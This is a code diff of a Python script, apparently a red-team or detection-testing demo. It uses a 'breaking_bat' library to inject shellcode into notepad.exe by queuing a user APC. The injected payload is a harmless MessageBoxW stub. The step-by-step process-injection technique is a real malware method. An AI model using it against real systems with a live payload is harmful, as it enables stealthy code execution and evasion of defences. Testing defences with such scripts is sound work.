@@ -1,14 +1,27 @@
-import breaking_bat
+import breaking_bat as bb
 from breaking_bat import RemoteProcessOpenMethod, RemoteProcessMemoryMethod
 
-print("Script: Inject via queue user APC")
-print()
+if __name__ == "__main__":
 
-breaking_bat.init_sysapi(ntdll_load_copy=True)
+    print("Script: Inject via queue user APC")
+    print()
 
-breaking_bat.set_default_options(
-    open_method=RemoteProcessOpenMethod.OpenProcess,
-    memory_method=RemoteProcessMemoryMethod.AllocateInAddr
-)
+    bb.init_sysapi(ntdll_load_copy=True)
+    bb.set_default_options(
+        open_method=RemoteProcessOpenMethod.OpenProcess,
+        memory_method=RemoteProcessMemoryMethod.AllocateInAddr
+    )
 
-breaking_bat.inject_queue_apc("notepad.exe")
+    shellcode = bb.shellcode_get_messageboxw();
+
+    pid = bb.process_find("notepad.exe")
+    bb.process_open(pid)
+    bb.process_thread_open_alertable()
+
+    mem_ctx = bb.process_init_memory(pid=pid)
+    bb.memory_set_size(ctx=mem_ctx, size=len(shellcode))
+    bb.process_create_memory(ctx=mem_ctx)
+    bb.process_write_memory(ctx=mem_ctx, data=shellcode)
+    bb.process_thread_queue_user_apc(bb.memory_get_remote_address(ctx=mem_ctx))
+
+    bb.script_success()
